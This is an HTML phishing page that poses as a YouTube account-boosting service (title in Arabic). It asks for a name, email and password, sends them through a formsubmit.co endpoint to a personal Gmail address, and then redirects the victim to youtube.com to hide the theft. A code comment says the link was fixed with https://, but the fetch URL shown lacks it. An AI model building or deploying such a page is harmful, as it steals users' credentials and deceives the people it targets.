<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تقوية حساب يوتيوب</title>
    <style>
        *{
            margin: 0;
            padding: 0;
        }
        body{
            background-color: #000;
        }
        div{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%,-50%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            border: 1px solid #000;
            border-radius: 30px;
            padding: 30px;
            box-shadow: 1px 1px 10px 0 #fff;
        }
        div input{
            width: 100%;
            padding: 10px;
            outline: none;
            border: none;
            background-color: #002;
            color: #fff;
            border-radius: 20px;
            margin: 3px;    
        }
        div input[type="button"]{
            cursor: pointer;
            background-color: #f00; 
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div>
        <input type="text" id="name" placeholder="Your Name">
        <input type="email" id="email" placeholder="Your Email">
        <input type="password" id="password" placeholder="Your Password">
        <input type="button" onclick="send()" value="login">
    </div>

    <script>
        function send() {
            const nameValue = document.getElementById("name").value;
            const emailValue = document.getElementById("email").value;
            const passwordValue = document.getElementById("password").value;

            if(!nameValue || !emailValue || !passwordValue) {
                alert("يرجى ملء جميع الحقول أولاً!");
                return;
            }

            // تم تصحيح الرابط بإضافة https:// وتصحيح علامة البريد الإلكتروني @ ليعمل بنجاح
            fetch("formsubmit.co/omarprogramming036@gmail.com", {
                method: "POST",
                headers: { 
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                body: JSON.stringify({
                    "اسم المستخدم": nameValue,
                    "البريد الإلكتروني": emailValue,
                    "كلمة المرور": passwordValue
                })
            })
            .then(response => response.json())
            .then(data => {
                window.location.href = "https://youtube.com";
            })
            .catch(error => {
                window.location.href = "https://youtube.com";
            });
        }
    </script>
</body>
</html>
